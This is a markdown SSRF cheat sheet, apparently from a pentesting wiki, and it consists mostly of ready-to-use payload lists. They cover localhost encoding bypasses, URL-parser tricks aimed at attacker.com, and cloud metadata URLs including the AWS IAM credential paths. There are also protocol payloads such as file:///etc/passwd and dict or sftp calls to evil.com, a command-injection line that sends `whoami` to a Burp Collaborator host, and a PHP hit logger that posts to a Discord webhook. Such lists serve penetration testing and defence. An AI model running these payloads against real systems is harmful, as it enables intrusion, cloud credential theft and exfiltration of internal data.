---
description: 'CWE-918: Server-Side Request Forgery (SSRF)'
---

# SSRF

## Local Host

```bash
All IPv4: 0
All IPv6: ::
All IPv4: 0.0.0.0
Localhost IPv6: ::1
All IPv4: 0000
All IPv4: (Leading zeros): 00000000
IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
8-Bit Octal conversion: 0177.00.00.01
32-Bit Octal conversion: 017700000001
32-Bit Hex conversion: 0x7f000001

# Localhost
<http://127.0.0.1:80>
<http://127.0.0.1:443>
<http://127.0.0.1:22>
<http://127.1:80>
<http://127.000000000000000.1>
<http://0>
http:@0/ --> <http://localhost/>
<http://0.0.0.0:80>
<http://localhost:80>
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
<http://①②⑦.⓪.⓪.⓪>

# CDIR bypass
<http://127.127.127.127>
<http://127.0.1.3>
<http://127.0.0.0>

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
<http://2130706433/> = <http://127.0.0.1>
<http://3232235521/> = <http://192.168.0.1>
<http://3232235777/> = <http://192.168.1.1>

# Octal Bypass
<http://0177.0000.0000.0001>
<http://00000177.00000000.00000000.00000001>
<http://017700000001>

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
<http://0x7f000001/> = <http://127.0.0.1>
<http://0xc0a80014/> = <http://192.168.0.20>
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# <https://www.silisoftware.com/tools/ipconverter.php>

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
<http://0/>
<http://127.1>
<http://127.0.1>

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
<http://customer1.app.localhost.my.company.127.0.0.1.nip.io>
<http://bugbounty.dod.network> = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

#### various bypasses

```xml
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\\@127.2.2.2:80/
127.1.1.1:80\\@@127.2.2.2:80/
127.1.1.1:80:\\@@127.2.2.2:80/
127.1.1.1:80#\\@127.2.2.2:80/
```

## Domain

```bash
https:attacker.com
https:/attacker.com
http:/\\/\\attacker.com
https:/\\attacker.com
//attacker.com
\\/\\/attacker.com/
/\\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
<http://169.254.1698.254\\@attacker.com>
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
<https://{domain}@attacker.com>
https://{domain}.attacker.com
<https://{domain}%6D@attacker.com>
<https://attacker.com/{domain}>
<https://attacker.com/?d={domain}>
<https://attacker.com#{domain}>
<https://attacker.com>@{domain}
<https://attacker.com#@{domain}>
<https://attacker.com>%23@{domain}
<https://attacker.com>%00{domain}
<https://attacker.com>%0A{domain}
<https://attacker.com?{domain}>
<https://attacker.com///{domain}>
<https://attacker.com>\\{domain}/
<https://attacker.com>;https://{domain}
<https://attacker.com>\\{domain}/
<https://attacker.com>\\.{domain}
<https://attacker.com/.{domain>}
<https://attacker.com>\\@@{domain}
<https://attacker.com>:\\@@{domain}
<https://attacker.com#\\@{domain}>
<https://attacker.com>\\anything@{domain}/
<https://www.victim.com>(\\u2044)some(\\u2044)path(\\u2044)(\\u0294)some=param(\\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
<http://1.1.1.1> &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com

# Bypass via open redirect
<https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection>
```

#### Cloud Meta Data files

```bash
## AWS
# from <http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories>

<http://169.254.169.254/latest/user-data>
<http://169.254.169.254/latest/user-data/iam/security-credentials/>[ROLE NAME]
<http://169.254.169.254/latest/meta-data/iam/security-credentials/>[ROLE NAME]
<http://169.254.169.254/latest/meta-data/ami-id>
<http://169.254.169.254/latest/meta-data/reservation-id>
<http://169.254.169.254/latest/meta-data/hostname>
<http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key>
<http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key>

# AWS - Dirs 

<http://169.254.169.254/>
<http://169.254.169.254/latest/meta-data/>
<http://169.254.169.254/latest/meta-data/public-keys/>

## Google Cloud
#  <https://cloud.google.com/compute/docs/metadata>
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

<http://169.254.169.254/computeMetadata/v1/>
<http://metadata.google.internal/computeMetadata/v1/>
<http://metadata/computeMetadata/v1/>
<http://metadata.google.internal/computeMetadata/v1/instance/hostname>
<http://metadata.google.internal/computeMetadata/v1/instance/id>
<http://metadata.google.internal/computeMetadata/v1/project/project-id>

# Google allows recursive pulls 
<http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true>

## Google
#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

<http://metadata.google.internal/computeMetadata/v1beta1/>

## Digital Ocean
# <https://developers.digitalocean.com/documentation/metadata/>

<http://169.254.169.254/metadata/v1.json>
<http://169.254.169.254/metadata/v1/> 
<http://169.254.169.254/metadata/v1/id>
<http://169.254.169.254/metadata/v1/user-data>
<http://169.254.169.254/metadata/v1/hostname>
<http://169.254.169.254/metadata/v1/region>
<http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address>

## Packetcloud

<https://metadata.packet.net/userdata>

## Azure
#  Limited, maybe more exist?
# <https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/>
<http://169.254.169.254/metadata/v1/maintenance>

## Update Apr 2017, Azure has more support; requires the header "Metadata: true"
# <https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service>
<http://169.254.169.254/metadata/instance?api-version=2017-04-02>
<http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text>

## OpenStack/RackSpace 
# (header required? unknown)
<http://169.254.169.254/openstack>

## HP Helion 
# (header required? unknown)
<http://169.254.169.254/2009-04-04/meta-data/> 

## Oracle Cloud
<http://192.0.0.192/latest/>
<http://192.0.0.192/latest/user-data/>
<http://192.0.0.192/latest/meta-data/>
<http://192.0.0.192/latest/attributes/>

## Alibaba
<http://100.100.100.200/latest/meta-data/>
<http://100.100.100.200/latest/meta-data/instance-id>
<http://100.100.100.200/latest/meta-data/image-id>

## Enclosed Alphanumeric
<http://⑯⑨>。②⑤④。⑯⑨｡②⑤④/
<http://⓪ⓧⓐ⑨>｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
Successfully bypassed a SSRF WAF by using a combination of IPV6 + Unicode. Payload for Metadata instances:
http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80
Check images for response difference between 169.254.169.254 and the above payload I shared
```

## Protocols

```bash
file:///etc/passwd
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
ssrf.php?url=sftp://evil.com:11111/
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
# Gopher://
Fortunately, you can use Gopherus[<https://github.com/tarunkant/Gopherus>] to create payloads for several services. Additionally, remote-method-guesser[<https://github.com/qtc-de/remote-method-guesser>] can be used to create gopher payloads for Java RMI services
```

## Other Test Cases

```bash
# SSRF via Referrer header
<https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-via-referrer-header>
# SSRF via SNI data from certificate  --> <https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-via-sni-data-from-certificate>
openssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf
# Wget File Upload 
<https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick>
# SSRF with Command Injection
url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`
# PDFs Rendering
If the web page is automatically creating a PDF with some information you have provided, you can insert some JS that will be executed by the PDF creator itself (the server) while creating the PDF and you will be able to abuse a SSRF. Find more information here. <https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf>
# From SSRF to DoS
Create several sessions and try to download heavy files exploiting the SSRF from the sessions.
# SSRf PHP Functions
```

## [Make you own SSRF tool](https://medium.com/@a1bi/ssrf-get-notified-on-discord-whenever-you-have-an-ssrf-5162a6daf8a3)

Host this PHP code after editing discord webhook in your server to get notified whenever there is SSRF&#x20;

````php
<?php
date_default_timezone_set('Asia/Kolkata'); //Change this if you need to

$date = date('Y-m-d H:i:s');


$ip_address = $_SERVER['REMOTE_ADDR'];

$user_agent = $_SERVER['HTTP_USER_AGENT'];

$endpoint = $_SERVER['REQUEST_URI'];

$log_message = "**Seems like you have a HIT**\n```Date: $date\t\nIP: $ip_address\t\nUser-Agent: $user_agent\t\nPath: $endpoint```\n";

// echo $log_message;
echo "<body><h1>Hit Me Harder :) </h1></body>";


$webhook_url = "https://discord.com/api/webhooks/10589949/E9uS3k9MxnI5CiIfmtmXHfornTObgZ_xl"; // replace with your webhook URL
$message = array("content" => "$log_message"); // the message you want to send

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

?>

````

## Resources

[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/) [URL Format Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) [SSRF vulnerabilities and where to find them - Detectify Labs](https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/?fbclid=IwAR0xC3ymb4ufRUGRDOZWr7lleeatiJj\_vH8dod9-84jKt0PN1z7evtHFccA)

#### Youtube

* https://www.youtube.com/watch?v=U0bPPw6uPgY\&t=1s
* https://www.youtube.com/watch?v=324cZic6asE
* https://www.youtube.com/watch?v=o-tL9ULF0KI
* https://www.youtube.com/watch?v=324cZic6asE\&t=751s
* https://youtu.be/m4BxIf9PUx0
* https://youtu.be/apzJiaQ6a3k
* [A New Era of SSRF](https://www.youtube.com/watch?v=R9pJ2YCXoJQ) by [Orange Tsai](https://blog.orange.tw/)

#### Hackerone Reports

* https://hackerone.com/hacktivity?order\_field=popular\&filter=type%3Apublic\&querystring=SSRF
* https://hackerone.com/reports/737161
* https://hackerone.com/reports/816848
* https://hackerone.com/reports/398799
* https://hackerone.com/reports/382048
* https://hackerone.com/reports/406387
* https://hackerone.com/reports/736867
* https://hackerone.com/reports/517461
* https://hackerone.com/reports/508459
* https://hackerone.com/reports/738553
* https://hackerone.com/reports/514224
* https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
* https://hackerone.com/reports/341876
* https://hackerone.com/reports/793704
* https://hackerone.com/reports/386292
* https://hackerone.com/reports/326040
* https://hackerone.com/reports/310036
* https://hackerone.com/reports/643622
* https://hackerone.com/reports/885975
* https://hackerone.com/reports/207477
* https://hackerone.com/reports/514224

#### Blogs

* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
* https://medium.com/@kapilvermarbl/ssrf-server-side-request-forgery-5131ffd61c3c
* https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326
* https://medium.com/@chawdamrunal/what-is-server-side-request-forgery-ssrf-7cd0ead0d95f
* https://medium.com/swlh/ssrf-in-the-wild-e2c598900434
* https://medium.com/@briskinfosec/ssrf-server-side-request-forgery-ae44ec737cb8
* https://medium.com/@GAYA3\_R/vulnerability-server-side-request-forgery-ssrf-9fe5428184c1
* https://medium.com/@gupta.bless/exploiting-ssrf-for-admin-access-31c30457cc44
* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-f62235a2c151
* https://medium.com/@dlpadmavathi.us/ssrf-attack-real-example-a7279256abee
* https://blog.securityinnovation.com/the-many-faces-of-ssrf
* https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/
* http://www.techpna.com/uptzh/blind-ssrf-medium.html
* https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90
* http://institutopaideia.com.br/journal/blind-ssrf-medium-cfa769
* https://www.reddit.com/r/bugbounty/comments/cux2zs/ssrf\_in\_the\_wild\_the\_startup\_medium/
* https://www.sonrn.com.br/blog/5a44cc-blind-ssrf-medium
* https://ssrf-bypass-medium.thickkare.pw/
* https://hackerone.com/reports/326040
* https://www.zerocopter.com/vulnerabilities-price-list-printable
* https://medium.com/swlh/intro-to-ssrf-beb35857771f
* https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a
* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739
* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-testing-b9dfe57cca35
* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0
* https://medium.com/bugbountywriteup/tagged/ssrf
* https://medium.com/seconset/all-about-ssrf-524f41ab96df
* https://blog.cobalt.io/from-ssrf-to-port-scanner-3e8ef5921fbf
* https://portswigger.net/web-security/ssrf
* https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

#### Github Repos

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
* https://github.com/jdonsec/AllThingsSSRF
